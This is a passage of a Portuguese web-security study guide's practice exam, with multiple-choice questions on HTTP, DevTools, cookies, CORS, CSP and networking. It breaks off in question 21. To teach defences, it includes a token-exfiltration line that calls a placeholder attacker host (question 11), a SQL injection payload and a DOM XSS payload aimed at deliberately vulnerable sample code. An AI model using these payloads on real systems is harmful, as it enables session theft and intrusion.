> [⬅️ 8. Glossário Técnico (A–Z)](./07-glossario-tecnico.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | *(Fim da Apostila)*

---

<a id="s9"></a>
## 9. Simulado Completo para a Prova

Este simulado foi elaborado com rigor acadêmico para consolidar e testar de forma integrada todos os conhecimentos de **Fundamentos do Desenvolvimento Web** ([Seção 1](./01a-fundamentos-web-parte1.md#s1)), **Inspeção e Auditoria com o Google Chrome DevTools — Abas Network, Application e Console** ([Seção 2](./02a-devtools-network.md#s2)), **Cybersecurity e Vulnerabilidades Web** ([Seção 3](./03a-vulnerabilidades-parte1.md#s3)), **Redes de Computadores** ([Seção 4](./04-redes-de-computadores.md#s4)), **Headers de Segurança HTTP** ([Seção 5](./05-headers-de-seguranca.md#s5)), **Checklist de Auditoria pelo Navegador** ([Seção 6](./06-checklist-e-comparativo.md#s6)) e **Comparativo Seguro vs. Inseguro** ([Seção 7](./06-checklist-e-comparativo.md#s7)).

> [!IMPORTANT]
> **Instruções para realização do simulado:**
> 1. **Não consulte o gabarito antes de concluir as questões:** Todas as **65 questões** estão apresentadas de forma contínua nas subseções [9.1](#s9-1) a [9.4](#s9-4), sem revelação imediata das respostas. O **Gabarito Oficial e a Resolução Comentada completa** encontram-se exclusivamente na subseção [9.5](#s9-5).
> 2. **Progressão de dificuldade:** As questões estão organizadas em três faixas de complexidade (**Nível Básico**, **Nível Intermediário** e **Nível Avançado**), cobrindo desde conceitos fundamentais de protocolo até diagnósticos forenses em múltiplas abas do Chrome DevTools.
> 3. **Tempo sugerido de prova:** Reserve **3 horas** para responder às 30 questões de múltipla escolha, 15 de verdadeiro ou falso, 10 discursivas e 10 práticas de interpretação do DevTools.

| Bloco da Prova | Quantidade | Intervalo | Formato e Objetivo Avaliativo |
| :--- | :---: | :---: | :--- |
| **Múltipla Escolha — Nível Básico** | 10 questões | Questões 1 a 10 | Conceitos essenciais de HTTP, HTTPS, códigos de status (`200`, `401`, `403`, `500`), TCP vs. UDP, cookies (`HttpOnly`), Web Storage, TTFB e XSS. |
| **Múltipla Escolha — Nível Intermediário** | 10 questões | Questões 11 a 20 | Riscos de JWT no `localStorage`, CORS (`Access-Control-Allow-Origin: *`), função do CSP, filtros do DevTools, `SameSite`, SQL Injection, CIDR e OSI. |
| **Múltipla Escolha — Nível Avançado** | 10 questões | Questões 21 a 30 | Ataques criptográficos em JWT, SSRF, HTTP/2 e HTTP/3 (`QUIC`), isolamento cross-origin (`COOP`/`COEP`), TOCTOU, Path Traversal, TLS 1.3 e Service Workers. |
| **Verdadeiro ou Falso** | 15 questões | Questões 31 a 45 | Julgamento objetivo de afirmações técnicas graduadas do nível básico ao avançado sobre protocolos, segurança e DevTools. |
| **Questões Discursivas** | 10 questões | Questões 46 a 55 | Raciocínio arquitetural, comparação técnica aprofundada, escrita de código seguro e proposição de defesas em profundidade. |
| **Interpretação Prática do DevTools** | 10 questões | Questões 56 a 65 | Análise de capturas textuais reais das abas **Network**, **Application** e **Console**, diagnóstico de vulnerabilidades e plano de remediação. |

---

<a id="s9-1"></a>
### 9.1 Questões de Múltipla Escolha (Questões 1 a 30)

Para cada uma das questões de **1 a 30**, selecione a **única alternativa correta** entre as opções `A`, `B`, `C`, `D` e `E`.

<a id="s9-1-1"></a>
#### 9.1.1 Nível Básico (Questões 1 a 10)

##### Questão 1 (Nível Básico — Código de Status HTTP `200`)
Durante a inspeção da aba **Network** do Google Chrome DevTools, um estudante observa que a requisição `GET https://api.loja-ficticia.test/v1/produtos` retornou o código de status **`200 OK`**. De acordo com a especificação da semântica HTTP (RFC 9110), o que significa exatamente esse código de status e como ele se diferencia de outros códigos da classe `2xx` e `3xx`?

- **A)** Significa que o servidor redirecionou o navegador com sucesso para um cache local, sem transferir corpo de resposta na mensagem HTTP.
- **B)** Significa que a requisição foi recebida, compreendida, aceita e processada com sucesso pelo servidor, e que a resposta contém uma representação do recurso solicitado (em um `GET`) ou uma descrição do resultado da ação (em um `POST`).
- **C)** Significa que um novo recurso foi criado com sucesso no banco de dados como resultado obrigatório de uma requisição `PUT` ou `POST`, exigindo o envio do cabeçalho `Location`.
- **D)** Significa apenas que a conexão TCP (Transmission Control Protocol — Protocolo de Controle de Transmissão) foi aberta com sucesso na porta `80` ou `443`, mesmo que a aplicação tenha falhado internamente ao consultar o banco de dados.
- **E)** Significa que o servidor processou a requisição com sucesso, mas está proibido de enviar qualquer conteúdo no corpo (*payload*) da resposta, comportamento exclusivo do código `200 OK`.

##### Questão 2 (Nível Básico — Identificação de Requisição HTTPS)
Um analista de segurança precisa verificar rapidamente se todas as requisições carregadas por uma página estão utilizando **HTTPS** (HTTP over TLS — HTTP sobre Transport Layer Security) sem a ocorrência de *Mixed Content* (conteúdo misto). Ao inspecionar a aba **Network** do Chrome DevTools, quais indicadores confirmam tecnicamente que uma requisição específica trafegou sob HTTPS?

- **A)** A coluna `Status` exibe o código `200`, a coluna `Method` exibe `POST` e o cabeçalho `Cache-Control` contém a diretiva `private`.
- **B)** A coluna `Type` exibe `fetch`, a coluna `Priority` exibe `High` e a aba **Preview** renderiza um objeto JSON formatado.
- **C)** A coluna `Scheme` exibe `https` (ou a URL inicia com `https://`), a coluna `Remote Address` aponta tipicamente para a porta `:443`, o painel **Timing** inclui a barra correspondente à fase **SSL** (negociação TLS) na conexão inicial e a seção **Security** confirma o protocolo TLS e o certificado.
- **D)** A coluna `Protocol` exibe obrigatoriamente `http/1.1` e o cabeçalho de requisição `User-Agent` contém a palavra `Secure`.
- **E)** O tamanho em `Size` é exibido como `(memory cache)` e a coluna `Initiator` exibe `other`.

##### Questão 3 (Nível Básico — Diferença entre Status `401` e `403`)
Em provas acadêmicas e entrevistas técnicas de desenvolvimento web e cibersegurança, a distinção entre os códigos de status HTTP **`401 Unauthorized`** e **`403 Forbidden`** é fundamental. Assinale a alternativa que descreve corretamente a diferença técnica entre ambos segundo a RFC 9110:

- **A)** O código `401 Unauthorized` indica falha de **autenticação** (a requisição não possui credenciais de autenticação válidas para o recurso-alvo, devendo ser acompanhada pelo header `WWW-Authenticate`), enquanto o código `403 Forbidden` indica falha de **autorização** (o servidor compreendeu a requisição, mas recusa-se a autorizá-la, e autenticar-se novamente não mudará o resultado).
- **B)** O código `401 Unauthorized` indica que a conta do usuário foi banida permanentemente por excesso de requisições (*rate limiting*), enquanto o código `403 Forbidden` indica apenas que a senha digitada expirou.
- **C)** O código `401 Unauthorized` é utilizado para falhas de autorização (usuário logado sem permissão de administrador), enquanto o código `403 Forbidden` é utilizado exclusivamente quando o usuário ainda não fez login no sistema.
- **D)** O código `401 Unauthorized` indica que o recurso não foi encontrado no servidor, enquanto o código `403 Forbidden` indica que o método HTTP utilizado (`DELETE` ou `PUT`) não é suportado pela rota.
- **E)** Não há diferença semântica entre `401` e `403` no protocolo HTTP; a escolha depende apenas se a resposta é gerada pelo servidor web Nginx (`403`) ou pelo código da aplicação back-end (`401`).

##### Questão 4 (Nível Básico — Diferença entre Session Storage e Local Storage)
As APIs de armazenamento web (`Web Storage API`), inspecionáveis na aba **Application** do Chrome DevTools, oferecem dois mecanismos principais de armazenamento chave-valor em strings: **`localStorage`** e **`sessionStorage`**. Qual é a principal diferença técnica entre eles?

- **A)** O `localStorage` envia seus dados automaticamente em todas as requisições HTTP através do cabeçalho `Cookie`, enquanto o `sessionStorage` só envia seus dados em requisições `POST`.
- **B)** O `sessionStorage` é criptografado nativamente pelo navegador e inacessível ao JavaScript via `window.sessionStorage`, sendo imune a ataques de XSS, enquanto o `localStorage` é acessível por scripts.
- **C)** O `localStorage` armazena até 1 GB de objetos binários indexados de forma assíncrona, enquanto o `sessionStorage` armazena apenas 4 KB e expira em 5 minutos.
- **D)** O `localStorage` persiste os dados por origem no disco sem prazo de expiração automático (mantendo-os mesmo após fechar a aba ou reiniciar o navegador) e é compartilhado entre todas as abas de mesma origem; já o `sessionStorage` é isolado por aba (*top-level browsing context*) e seus dados são descartados assim que a aba ou janela é fechada.
- **E)** O `localStorage` permite leitura por qualquer domínio da Internet (*cross-origin*), enquanto o `sessionStorage` aplica a *Same-Origin Policy* (SOP).

##### Questão 5 (Nível Básico — Significado de uma Resposta `500`)
Ao submeter um formulário de cadastro em uma aplicação web, a requisição `POST /api/usuarios` aparece destacada em vermelho na aba **Network** do DevTools com o status **`500 Internal Server Error`**. O que esse código significa e qual é o principal risco de segurança caso o servidor esteja mal configurado em ambiente de produção?

- **A)** Significa que o cliente enviou um JSON sintaticamente malformado; o risco é o navegador travar ao tentar renderizar a resposta.
- **B)** Significa que o servidor de borda (Proxy Reverso) não obteve resposta dentro do tempo limite (*timeout*) do servidor de origem; o risco é expor o endereço MAC do roteador do cliente.
- **C)** Significa que o cliente não possui permissão para acessar o banco de dados; o risco é o navegador desativar automaticamente o protocolo HTTPS.
- **D)** Significa que o navegador bloqueou a requisição por violação de CORS (*Cross-Origin Resource Sharing*) antes mesmo de ela sair da máquina do usuário.
- **E)** Significa que o servidor encontrou uma condição inesperada ou exceção não tratada no back-end que o impediu de atender à requisição; o principal risco de segurança em produção é retornar *stack traces* (rastreamentos de pilha), fragmentos de consultas SQL, caminhos internos de diretórios e versões de bibliotecas no corpo da resposta, facilitando o reconhecimento por um atacante.

##### Questão 6 (Nível Básico — Diferença entre TCP e UDP)
Na camada de transporte do modelo TCP/IP, os protocolos **TCP** (*Transmission Control Protocol*) e **UDP** (*User Datagram Protocol*) atendem a requisitos distintos de comunicação em rede. Assinale a alternativa que apresenta corretamente a diferença entre ambos:

- **A)** O TCP opera na Camada 2 (Enlace) utilizando endereços MAC, enquanto o UDP opera na Camada 3 (Rede) utilizando endereços IPv4 e IPv6.
- **B)** O TCP é orientado a conexão (estabelecida pelo *Three-Way Handshake*: `SYN`, `SYN-ACK`, `ACK`), garante entrega confiável, ordenação de segmentos, retransmissão de perdas e controle de fluxo/congestionamento; já o UDP não é orientado a conexão (*connectionless*), não realiza *handshake* nem garante entrega ou ordem na camada de transporte, oferecendo menor cabeçalho e menor latência.
- **C)** O UDP é utilizado exclusivamente em redes locais cabeadas (LAN), sendo bloqueado por padrão em roteadores de borda da Internet pública, onde apenas pacotes TCP podem trafegar.
- **D)** O TCP não utiliza portas lógicas de origem e destino, enquanto o UDP introduziu o conceito de portas de 16 bits (`0` a `65535`).
- **E)** O HTTP/1.1 e o HTTP/2 funcionam sobre o protocolo UDP, enquanto o HTTP/3 (baseado no protocolo QUIC) migrou para o protocolo TCP para aumentar a confiabilidade.

##### Questão 7 (Nível Básico — Significado de um Cookie sem `HttpOnly`)
Na aba **Application > Storage > Cookies** do Chrome DevTools, um auditor analisa o cookie de sessão `SID_AUTH=8f92a1c4...` e constata que a coluna **`HttpOnly`** está desmarcada (vazia). O que significa tecnicamente a ausência do atributo `HttpOnly` nesse cookie?

- **A)** Significa que o cookie só poderá ser transmitido em conexões HTTPS criptografadas, sendo bloqueado em conexões HTTP em texto claro.
- **B)** Significa que o navegador não enviará esse cookie ao servidor em requisições HTTP convencionais, mantendo-o apenas na memória da placa de rede.
- **C)** Significa que o cookie pode ser lido e manipulado diretamente por scripts executados no navegador por meio da propriedade `document.cookie`, permitindo que um atacante roube o identificador de sessão caso consiga explorar uma vulnerabilidade de *Cross-Site Scripting* (XSS).
- **D)** Significa que o cookie será apagado automaticamente após 60 segundos de inatividade do usuário na página.
- **E)** Significa que o cookie está protegido contra ataques de *Cross-Site Request Forgery* (CSRF), pois exige confirmação manual do usuário a cada requisição.

##### Questão 8 (Nível Básico — O que é XSS)
A vulnerabilidade **XSS** (*Cross-Site Scripting*) figura historicamente entre as falhas mais críticas e frequentes em aplicações web (mapeada na categoria *Injection* do OWASP Top 10). O que caracteriza tecnicamente uma vulnerabilidade de XSS?

- **A)** É uma falha em que a aplicação inclui dados não confiáveis (fornecidos pelo usuário ou por fontes externas) em uma página web ou os processa no DOM sem validação, sanitização ou codificação contextual adequada, permitindo a execução de código JavaScript arbitrário no contexto da sessão do navegador da vítima.
- **B)** É uma falha em que um atacante injeta comandos SQL diretamente no banco de dados relacional do servidor para extrair a tabela de senhas sem passar pelo navegador de outros usuários.
- **C)** É um ataque de camada de rede em que o invasor inunda a porta TCP `443` do servidor com pacotes `SYN` forjados para derrubar o serviço web.
- **D)** É uma técnica exclusiva para falsificar o endereço IP de origem (*IP Spoofing*) em requisições DNS recursivas.
- **E)** É uma falha de configuração do certificado TLS que obriga o navegador a fazer *downgrade* de HTTPS para HTTP simples.

##### Questão 9 (Nível Básico — O que é TTFB)
Ao analisar a performance de uma requisição na aba **Network > Timing** do Chrome DevTools, destaca-se a métrica **TTFB** (*Time To First Byte* — Tempo até o Primeiro Byte), exibida na barra **Waiting for server response**. O que o TTFB mede exatamente?

- **A)** O tempo total necessário para baixar todos os arquivos de imagem, folhas de estilo CSS e pacotes JavaScript da página até o evento `window.onload`.
- **B)** Apenas o tempo gasto pelo servidor DNS local para resolver o nome de domínio em um endereço IPv4 ou IPv6.
- **C)** O tempo que o usuário leva para mover o mouse e clicar no primeiro botão interativo da interface após a renderização do HTML.
- **D)** O tempo decorrido entre o envio da requisição HTTP pelo cliente e o recebimento do primeiro byte da resposta enviada pelo servidor, englobando um tempo de ida e volta na rede (*Round-Trip Time* — RTT) somado ao tempo de processamento no servidor (execução de código back-end, consultas a banco de dados e geração da resposta).
- **E)** O tempo gasto pelo navegador para descomprimir um arquivo `.gzip` ou `.br` após o término completo do download pela rede.

##### Questão 10 (Nível Básico — Portas Padrão de Rede e Serviços)
Em uma auditoria de infraestrutura e regras de *firewall*, é indispensável conhecer as portas padrão (*Well-Known Ports* e *Registered Ports* da IANA) associadas aos principais protocolos de rede e bancos de dados. Assinale a alternativa que relaciona **todas** as portas corretamente aos seus respectivos serviços:

- **A)** `21` (SSH), `22` (FTP), `25` (DNS), `80` (HTTPS), `443` (HTTP), `3306` (PostgreSQL).
- **B)** `20/21` (Telnet), `23` (SSH), `53` (DHCP), `110` (SMTP), `143` (POP3), `3389` (MySQL).
- **C)** `22` (RDP), `53` (HTTP), `67/68` (DNS), `445` (HTTPS), `5432` (SMB), `8080` (SSH).
- **D)** `25` (IMAP), `80` (FTP), `110` (SSH), `443` (DNS), `3306` (RDP), `5432` (MySQL).
- **E)** `22` (SSH), `53` (DNS), `80` (HTTP), `443` (HTTPS), `3306` (MySQL), `3389` (RDP) e `5432` (PostgreSQL).

---

<a id="s9-1-2"></a>
#### 9.1.2 Nível Intermediário (Questões 11 a 20)

##### Questão 11 (Nível Intermediário — Risco de Armazenar JWT no Local Storage)
Em muitas aplicações modernas do tipo SPA (*Single-Page Application*), desenvolvedores optam por armazenar o token de acesso **JWT** (*JSON Web Token*) diretamente no `localStorage` do navegador (`localStorage.setItem('access_token', token)`). Qual é a principal vulnerabilidade arquitetural dessa abordagem?

- **A)** O `localStorage` altera automaticamente a assinatura criptográfica HMAC-SHA256 do JWT quando a aba entra em segundo plano, invalidando a sessão no servidor.
- **B)** Como o `localStorage` é integralmente acessível via JavaScript a qualquer script executado na mesma origem, a existência de uma única falha de XSS (no código da própria aplicação ou em uma biblioteca de terceiros/CDN comprometida) permite ler e exfiltrar o JWT com uma simples instrução como `fetch('https://atacante.test/?t=' + localStorage.getItem('access_token'))`.
- **C)** O navegador envia todo o conteúdo do `localStorage` na URL como *Query String* em todas as navegações para sites externos, vazando o JWT no cabeçalho `Referer`.
- **D)** O `localStorage` não suporta strings codificadas em Base64URL maiores que 64 bytes, truncando o *payload* do JWT.
- **E)** Armazenar o JWT no `localStorage` torna a aplicação vulnerável ao ataque clássico de CSRF por submissão oculta de formulário HTML `<form method="POST">`, pois o navegador anexa o `localStorage` automaticamente à requisição.

##### Questão 12 (Nível Intermediário — Significado de `Access-Control-Allow-Origin: *`)
Ao inspecionar os cabeçalhos de resposta (*Response Headers*) de uma API na aba **Network** do DevTools, você encontra `Access-Control-Allow-Origin: *`. O que essa configuração significa e qual é sua relação com o envio de credenciais no mecanismo de **CORS** (*Cross-Origin Resource Sharing*)?

- **A)** O curinga `*` instrui o navegador a permitir que código JavaScript executado em **qualquer origem** (`Origin`) leia o corpo da resposta dessa requisição; entretanto, por determinação da especificação Fetch/CORS, o curinga `*` **não pode** ser combinado com `Access-Control-Allow-Credentials: true` (se ambos forem enviados em uma requisição autenticada com `credentials: 'include'`, o navegador bloqueia a leitura da resposta e exibe um erro de CORS no Console).
- **B)** O curinga `*` desativa a criptografia TLS da conexão e permite que qualquer servidor na Internet modifique os arquivos internos do servidor de origem via método `DELETE`.
- **C)** O curinga `*` faz com que o navegador envie automaticamente todos os cookies (`HttpOnly` e `SameSite=Strict`) de todas as origens salvas no navegador para essa API.
- **D)** O curinga `*` bloqueia requisições vindas do mesmo domínio (*same-origin*) e permite apenas chamadas oriundas de domínios estrangeiros.
- **E)** O curinga `*` é uma configuração de firewall de camada 3 que libera todas as portas TCP e UDP do servidor para qualquer endereço IP da Internet.

##### Questão 13 (Nível Intermediário — Função do Content Security Policy — CSP)
O cabeçalho HTTP de resposta **`Content-Security-Policy` (CSP)** é um dos controles de segurança mais poderosos disponíveis nos navegadores modernos. Qual é a função primária do CSP e qual das políticas abaixo oferece proteção eficaz contra *Cross-Site Scripting* (XSS) e *Clickjacking*?

- **A)** Sua função é comprimir imagens e scripts para acelerar o TTFB; a política mais segura é `Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval';`.
- **B)** Sua função é substituir o uso do protocolo HTTPS em redes internas; a política mais segura é `Content-Security-Policy: upgrade-insecure-requests; script-src *;`.
- **C)** Sua função é permitir que o `localStorage` funcione entre domínios diferentes; a política mais segura é `Content-Security-Policy: connect-src *; frame-ancestors *;`.
- **D)** Sua função é atuar como uma camada declarativa de defesa em profundidade que restringe as origens e formas pelas quais recursos (scripts, estilos, conexões, objetos e quadros) podem ser carregados ou executados na página, mitigando o impacto de XSS e *Clickjacking*; uma política robusta utiliza `default-src 'self'; script-src 'self' 'nonce-8f4a9c2b1e'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';` (evitando `'unsafe-inline'` e `'unsafe-eval'`).
- **E)** Sua função é criptografar a senha do usuário no banco de dados com o algoritmo Argon2id antes do envio do formulário HTML.

##### Questão 14 (Nível Intermediário — Controles e Operadores de Filtro da Aba Network)
Um desenvolvedor está investigando um bug de autenticação em que o formulário de login (`POST`) responde com um código de erro e redireciona imediatamente a página para `/erro-login`, fazendo com que a requisição original desapareça da tabela da aba **Network** do Chrome DevTools. Além disso, ele deseja filtrar na tabela apenas requisições `POST` que não vieram do domínio da CDN (`cdn.exemplo.test`). Como ele deve configurar a aba **Network**?

- **A)** Desmarcar **Record network log**, ativar o modo **Offline** no menu *Throttling* e digitar `GET && cdn.exemplo.test` na caixa de busca.
- **B)** Abrir a aba **Console**, digitar `console.clear()` e filtrar por `mime-type:image/png` na aba **Network**.
- **C)** Marcar a opção **Preserve log** (para manter o histórico de requisições entre navegações e redirecionamentos), marcar **Disable cache** (para garantir respostas frescas do servidor) e utilizar na caixa **Filter** a expressão `method:POST -domain:cdn.exemplo.test`.
- **D)** Clicar em **Clear network log** antes do redirecionamento e utilizar o operador `larger-than:100M` na caixa de filtro.
- **E)** Ativar a opção **Hide data URLs** e selecionar o filtro de categoria **Img** na barra de ferramentas.

##### Questão 15 (Nível Intermediário — Atributo `SameSite` em Cookies e Proteção contra CSRF)
Sobre o atributo **`SameSite`** dos cookies HTTP (`Strict`, `Lax` e `None`), padronizado na evolução da RFC 6265 (RFC 6265bis), analise os cenários de envio cross-site e assinale a alternativa **correta**:

- **A)** Um cookie configurado com `SameSite=Strict` é enviado normalmente quando o usuário clica em um link `<a href="https://meu-banco.test/painel">` localizado em um site externo (`https://blog-noticias.test`), garantindo que o usuário já chegue autenticado na primeira requisição.
- **B)** Um cookie configurado com `SameSite=None` pode ser utilizado em conexões HTTP não criptografadas (`http://`) sem a necessidade do atributo `Secure`.
- **C)** Um cookie configurado com `SameSite=Lax` é enviado automaticamente em submissões cross-site de formulários via método `POST` (`<form action="https://meu-banco.test/transferir" method="POST">`) e em chamadas assíncronas `fetch()` disparadas por outros sites.
- **D)** O atributo `SameSite=Strict` impede que o JavaScript da própria página leia o cookie via `document.cookie`, substituindo completamente a necessidade da flag `HttpOnly`.
- **E)** Com `SameSite=Lax` (comportamento padrão nos navegadores modernos quando `SameSite` é omitido), o cookie **não** é enviado em sub-recursos cross-site (como `<img>`, `<iframe>`, `fetch`) nem em submissões de formulários `POST` cross-site, mas **é** enviado em navegações de nível superior (*top-level navigations*) com métodos seguros (como clicar em um link `<a href="...">` que executa um `GET`); já o `SameSite=None` exige obrigatoriamente o atributo `Secure`.

##### Questão 16 (Nível Intermediário — SQL Injection e Consultas Parametrizadas)
Considere o seguinte trecho de código de back-end em Node.js que autentica usuários em um laboratório de testes:

```javascript
const query = "SELECT id, email, perfil FROM usuarios WHERE email = '" + req.body.email + "' AND senha_hash = '" + hashSenha + "'";
const resultado = await db.query(query);
```

Caso um testador autorizado envie no campo `email` o payload clássico `' OR '1'='1' -- `, por que a vulnerabilidade de **SQL Injection** ocorre e por que o uso de *Prepared Statements* (consultas parametrizadas) neutraliza o ataque?

- **A)** A vulnerabilidade ocorre porque a concatenação direta mistura dados não confiáveis com a estrutura do comando SQL, permitindo que as aspas simples e os operadores lógicos do payload alterem a árvore sintática (*Abstract Syntax Tree* — AST) da consulta; já os *Prepared Statements* (`SELECT ... WHERE email = $1 AND senha_hash = $2`) compilam o plano de execução e a estrutura da query antecipadamente no banco de dados, tratando o parâmetro estritamente como um valor literal escalar e jamais como comando SQL executável.
- **B)** A vulnerabilidade ocorre apenas porque o banco de dados utiliza a porta `3306`; os *Prepared Statements* funcionam criptografando a conexão com TLS 1.3 entre o navegador e o servidor web.
- **C)** A vulnerabilidade ocorre porque o método HTTP utilizado foi `POST` em vez de `PUT`; os *Prepared Statements* resolvem o problema convertendo todas as aspas simples em tags HTML `<b>`.
- **D)** A vulnerabilidade ocorre no navegador do cliente por falta de `Content-Security-Policy`; os *Prepared Statements* são executados pelo Chrome DevTools antes do envio do formulário.
- **E)** A vulnerabilidade só pode ser corrigida removendo a cláusula `WHERE` de todas as consultas SQL e filtrando os registros no front-end com `Array.prototype.filter()`.

##### Questão 17 (Nível Intermediário — Cálculo de Sub-rede IPv4 e Notação CIDR)
Um engenheiro de redes alocou a sub-rede IPv4 **`192.168.10.64/26`** para o segmento de servidores de aplicação de um *data center*. Quais são, respectivamente, a **máscara de sub-rede em decimal pontilhado**, o **endereço de rede**, o **endereço de broadcast**, o **intervalo de endereços IP utilizáveis por hosts** e a **quantidade total de hosts válidos** nessa sub-rede?

- **A)** Máscara `255.255.255.128` | Rede `192.168.10.0` | Broadcast `192.168.10.127` | Hosts `192.168.10.1` a `192.168.10.126` | `126` hosts válidos.
- **B)** Máscara `255.255.255.224` | Rede `192.168.10.64` | Broadcast `192.168.10.95` | Hosts `192.168.10.65` a `192.168.10.94` | `30` hosts válidos.
- **C)** Máscara `255.255.255.192` | Rede `192.168.10.64` | Broadcast `192.168.10.127` | Hosts `192.168.10.65` a `192.168.10.126` | `62` hosts válidos.
- **D)** Máscara `255.255.255.240` | Rede `192.168.10.64` | Broadcast `192.168.10.79` | Hosts `192.168.10.65` a `192.168.10.78` | `14` hosts válidos.
- **E)** Máscara `255.255.255.192` | Rede `192.168.10.64` | Broadcast `192.168.10.128` | Hosts `192.168.10.64` a `192.168.10.127` | `64` hosts válidos.

##### Questão 18 (Nível Intermediário — DOM-Based XSS, `innerHTML` vs `textContent` e `eval()`)
Ao auditar um script front-end pela aba **Console** e **Sources** do DevTools, você encontra o seguinte código responsável por exibir o termo pesquisado pelo usuário e calcular descontos promocionais:

```javascript
const params = new URLSearchParams(window.location.search);
const busca = params.get('q');
const formulaDesconto = params.get('calc');

document.getElementById('resultado-titulo').innerHTML = 'Resultados para: ' + busca;
const valorFinal = eval(formulaDesconto);
```

Quais falhas de segurança estão presentes nesse código e qual é a forma correta de corrigi-las?

- **A)** O código contém apenas um erro de sintaxe (`SyntaxError`); basta trocar `const` por `var` para torná-lo seguro.
- **B)** O código apresenta duas vulnerabilidades graves no cliente: (1) **DOM-Based XSS** ao conectar uma fonte (*source*) controlada pelo atacante (`window.location.search`) diretamente ao sumidouro (*sink*) de interpretação de HTML `innerHTML` (explorável com `?q=<img src=x onerror=alert(1)>`); e (2) **Injeção e execução arbitrária de código** pelo uso de `eval()` sobre dados da URL. A correção exige substituir `innerHTML` por `textContent` (ou sanitizar com `DOMPurify` caso HTML rico seja estritamente necessário) e eliminar o `eval()`, realizando cálculos e validações de desconto no servidor com valores numéricos tipados (`Number.parseFloat`).
- **C)** O código é vulnerável a *SQL Injection* direto no navegador; a correção é adicionar `console.clear()` na primeira linha do script.
- **D)** O único problema é que `URLSearchParams` não funciona em conexões HTTPS; deve-se usar `document.write(window.location.href)` no lugar de `innerHTML`.
- **E)** O uso de `eval()` é seguro sempre que a string vier de `window.location.search`, pois o navegador filtra automaticamente códigos maliciosos na *Query String*.

##### Questão 19 (Nível Intermediário — Modelo OSI, PDUs e Protocolos ARP e DHCP)
Relacionando as sete camadas do **Modelo OSI** (*Open Systems Interconnection*), suas respectivas Unidades de Dados de Protocolo (**PDUs** — *Protocol Data Units*) e o funcionamento dos protocolos de rede local **ARP** (*Address Resolution Protocol*) e **DHCP** (*Dynamic Host Configuration Protocol*), assinale a alternativa **correta**:

- **A)** Na Camada 4 (Transporte), a PDU é chamada de *Quadro* (*Frame*) e o equipamento típico é o *Switch* de camada 2; já o protocolo DHCP utiliza o fluxo `SYN -> SYN-ACK -> ACK` para descobrir endereços MAC.
- **B)** Na Camada 3 (Rede), a PDU é chamada de *Bit*, onde atua o protocolo HTTP; já o protocolo ARP resolve nomes de domínio (como `exemplo.test`) em endereços IPv6.
- **C)** Na Camada 1 (Física), a PDU é chamada de *Segmento*, onde operam firewalls de aplicação (WAF) e servidores DNS autoritativos.
- **D)** Na Camada 2 (Enlace de Dados), a PDU é o *Quadro* (*Frame*, endereçado por MAC de 48 bits); na Camada 3 (Rede), a PDU é o *Pacote* (endereçado por IP); na Camada 4 (Transporte), a PDU é o *Segmento* (no TCP) ou *Datagrama* (no UDP). O **ARP** descobre o endereço físico MAC correspondente a um endereço IPv4 na rede local (via *ARP Request* em broadcast e *ARP Reply* em unicast), enquanto o **DHCP** atribui configurações IP dinamicamente por meio do fluxo **DORA** (*Discover, Offer, Request, Acknowledge*).
- **E)** O modelo TCP/IP possui 9 camadas e substituiu os endereços IP pelo protocolo ICMP (*Internet Control Message Protocol*) na camada de aplicação.

##### Questão 20 (Nível Intermediário — Headers de Segurança HTTP em Conjunto)
Em uma auditoria de cabeçalhos de segurança ([Seção 5](./05-headers-de-seguranca.md#s5)), um servidor respondeu com os quatro cabeçalhos abaixo:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

Assinale a alternativa que descreve com exatidão a proteção conferida por **cada um** desses quatro cabeçalhos, respectivamente:

- **A)** (1) Bloqueia scripts inline; (2) Comprime arquivos JSON; (3) Permite iframes de qualquer origem; (4) Envia a URL completa com *Query String* mesmo em downgrade de HTTPS para HTTP.
- **B)** (1) Criptografa as tabelas do banco de dados; (2) Impede SQL Injection; (3) Ativa o WebSocket; (4) Bloqueia cookies de terceiros.
- **C)** (1) Força o uso de HTTP na porta 80; (2) Permite que o navegador adivinhe o tipo MIME de imagens; (3) Abre links em nova aba; (4) Apaga o histórico do navegador.
- **D)** (1) Substitui o certificado TLS; (2) Habilita o CORS para todas as origens; (3) Habilita o `SharedArrayBuffer`; (4) Oculta o endereço IP do cliente.
- **E)** (1) Obriga o navegador a acessar o domínio e seus subdomínios exclusivamente via HTTPS pelos próximos 365 dias (`31536000` segundos), prevenindo *SSL Stripping*; (2) Impede o *MIME Sniffing*, forçando o navegador a respeitar estritamente o `Content-Type` declarado; (3) Proíbe que a página seja embutida em `<frame>` ou `<iframe>` em qualquer site, prevenindo *Clickjacking*; (4) Envia a URL completa no cabeçalho `Referer` apenas para requisições de mesma origem, envia somente a origem (`esquema + host + porta`) em requisições *cross-origin* de mesmo nível de segurança (`HTTPS -> HTTPS`) e omite o `Referer` em caso de downgrade (`HTTPS -> HTTP`).

---

<a id="s9-1-3"></a>
#### 9.1.3 Nível Avançado (Questões 21 a 30)

##### Questão 21 (Nível Avançado — Vulnerabilidade de CORS com Reflexão de `Origin` e Credenciais)
Para "resolver" rapidamente erros de CORS reclamados por diferentes equipes de front-end, um desenvolvedor configurou o servidor da API de pagamentos (`https://api.banco-ficticio.test`) com o seguinte middleware:

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

Considerando que a API autentica os clientes por meio de um cookie de sessão com `SameSite=None; Secure; HttpOnly`, qual é a consequência técnica e de segurança dessa implementação?

- **A)** A implementação é perfeitamente segura porque o cabeçalho `Origin` nunca pode ser enviado por sites externos e a flag `HttpOnly` impede qualquer leitura da resposta pelo navegador.
- **B)** O navegador bloqueará todas as respostas porque `Access-Control-Allow-Credentials: true` só funciona quando `Access-Control-Allow-Origin` é igual ao curinga `*`.
